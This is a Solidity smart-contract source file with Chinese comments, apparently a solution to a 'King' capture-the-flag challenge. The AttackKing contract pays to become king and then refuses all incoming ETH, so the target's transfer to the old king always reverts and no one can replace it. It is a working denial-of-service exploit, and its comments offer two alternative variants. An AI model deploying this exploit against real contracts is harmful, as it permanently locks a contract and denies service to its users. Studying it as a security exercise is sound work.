// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title AttackKing
 * @notice 通过拒绝接收 ETH 来永久占据 king 位置
 *
 * 攻击原理：
 * 1. King 合约在更新 king 前会 transfer ETH 给旧 king
 * 2. transfer() 失败会导致整个交易 revert
 * 3. 我们的合约拒绝接收 ETH，导致无人能取代我们
 */
contract AttackKing {
    /**
     * @notice 成为 king
     * @param target King 合约地址
     */
    function attack(address payable target) external payable {
        // 发送足够的 ETH 成为 king
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Failed to become king");
    }

    /**
     * @notice 我们故意不实现 receive() 和 fallback()
     * 这样任何人向我们转账都会失败
     *
     * 当有人试图成为新 king 时：
     * 1. King 合约执行: payable(king).transfer(msg.value)
     * 2. 尝试向我们（旧 king）转账
     * 3. 我们没有 receive()，转账失败
     * 4. 整个交易 revert
     * 5. 我们保持 king 身份
     */

    // 方法 1: 完全不实现 receive/fallback（当前使用）
    // ✓ 最简单直接

    // 方法 2: 实现但主动 revert（取消注释可使用）
    // receive() external payable {
    //     revert("I refuse to accept ETH!");
    // }

    // 方法 3: 消耗大量 gas（取消注释可使用）
    // receive() external payable {
    //     assert(false);  // 消耗所有 gas
    // }

    /**
     * @notice 查询当前 king
     */
    function getCurrentKing(address target) external view returns (address) {
        (bool success, bytes memory data) = target.staticcall(
            abi.encodeWithSignature("_king()")
        );
        require(success, "Failed to get king");
        return abi.decode(data, (address));
    }

    /**
     * @notice 查询当前 prize
     */
    function getPrize(address target) external view returns (uint256) {
        (bool success, bytes memory data) = target.staticcall(
            abi.encodeWithSignature("prize()")
        );
        require(success, "Failed to get prize");
        return abi.decode(data, (uint256));
    }
}
